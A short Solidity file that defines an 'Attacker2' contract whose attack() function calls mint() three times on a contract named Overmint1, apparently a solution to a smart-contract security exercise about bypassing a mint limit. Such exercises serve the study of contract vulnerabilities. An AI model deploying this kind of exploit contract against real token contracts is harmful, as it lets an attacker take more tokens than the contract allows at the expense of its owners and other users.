// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {IERC721Receiver} from "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./Overmint1.sol";

contract Attacker2 {
    Overmint1 public vulnerableContract;

    constructor(address vulnerableContract_) {
        vulnerableContract = Overmint1(vulnerableContract_);
    }
    function attack() external {
        vulnerableContract.mint();
        vulnerableContract.mint();
        vulnerableContract.mint();
    }
}
